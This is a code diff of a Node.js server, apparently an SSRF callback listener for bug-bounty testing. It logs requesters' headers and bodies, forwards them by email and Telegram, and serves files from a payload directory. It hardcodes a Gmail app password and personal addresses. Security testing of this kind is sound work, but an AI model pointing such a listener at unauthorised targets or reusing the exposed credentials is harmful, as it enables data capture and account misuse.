@@ -7,8 +7,8 @@ const fetch = require('node-fetch');
 // === CONFIGURATION ===
 
 // Gmail setup
-const gmailUser = 'mzeroaccess@gmail.com';  // your gmail
-const gmailPass = 'pext txcx xmsv ytbd'; // app password
+const gmailUser = 'mzeroaccess@gmail.com';
+const gmailPass = 'pext txcx xmsv ytbd';
 
 const transporter = nodemailer.createTransport({
     service: 'gmail',
@@ -62,18 +62,30 @@ const server = http.createServer((req, res) => {
     console.log(`➡️  URL: ${req.url}`);
     console.log(`🧠 Headers:`, req.headers);
 
-    let body = [];
-    req.on('data', chunk => body.push(chunk));
+    let bodyChunks = [];
+    req.on('data', chunk => bodyChunks.push(chunk));
     req.on('end', () => {
-        body = Buffer.concat(body).toString();
-        if (body) console.log(`📦 Body: ${body}`);
-    
-        const fullRequestDetails = `⚡ New Request!\n\n` +
+        let rawBody = Buffer.concat(bodyChunks).toString();
+        let parsedBody = rawBody;
+
+        if (req.headers['content-type'] && req.headers['content-type'].includes('application/json')) {
+            try {
+                parsedBody = JSON.stringify(JSON.parse(rawBody), null, 2);
+                console.log(`📦 JSON Body:\n${parsedBody}`);
+            } catch (err) {
+                console.error('❌ Error parsing JSON body:', err.message);
+                parsedBody = rawBody; // fallback
+            }
+        } else {
+            console.log(`📦 Body:\n${rawBody}`);
+        }
+
+        const fullRequestDetails = `⚡ New Request at ${now}!\n\n` +
             `➡️ IP Chain: ${ipChain.join(' → ')}\n` +
             `➡️ URL: ${req.url}\n\n` +
             `🧠 Headers:\n${JSON.stringify(req.headers, null, 2)}\n\n` +
-            `📦 Body:\n${body || 'No Body'}`;
-    
+            `📦 Body:\n${parsedBody || 'No Body'}`;
+
         // Send Email
         const mailOptions = {
             from: gmailUser,
@@ -81,40 +93,37 @@ const server = http.createServer((req, res) => {
             subject: '⚡ SSRF Request Detected!',
             text: fullRequestDetails
         };
-    
+
         transporter.sendMail(mailOptions, (error, info) => {
-            if (error) {
-                console.error('❌ Error sending mail:', error);
-            } else {
-                console.log('✅ Mail sent:', info.response);
-            }
+            if (error) console.error('❌ Error sending mail:', error);
+            else console.log('✅ Mail sent:', info.response);
         });
 
-        // Send Telegram Alert (full details)
+        // Send Telegram Alert
         sendTelegramMessage(fullRequestDetails);
 
-        // Set CORS header to avoid browser warnings
+        // Set CORS header
         res.setHeader('Access-Control-Allow-Origin', '*');
-        
+
         // Serve payloads if exists
-        const filePath = path.join(__dirname, 'public', req.url);
-        if (req.url.startsWith('/payload/')) {
-            fs.readFile(filePath, (err, content) => {
+        const safePath = path.normalize(path.join(__dirname, 'public', req.url));
+        if (safePath.startsWith(path.join(__dirname, 'public')) && req.url.startsWith('/payload/')) {
+            fs.readFile(safePath, (err, content) => {
                 if (err) {
                     res.writeHead(404, { 'Content-Type': 'text/plain' });
                     res.end('File Not Found');
                     return;
                 }
-                
                 res.writeHead(200, { 'Content-Type': 'text/html' });
                 res.end(content);
             });
         } else {
-            res.writeHead(200, { 'Content-Type': 'text/plain' });
-            res.end('Active hackerone-theoneabove manuelxantony@gmail.com mzeroaccess@gmail.com');
+            res.writeHead(200, { 'Content-Type': 'application/json' });
+            res.end(JSON.stringify({ message: 'Active hackerone-theoneabove manuelxantony@gmail.com mzeroaccess@gmail.com'}));
         }
     });
 });
+
 
 const PORT = 4545;
 server.listen(PORT, () => {
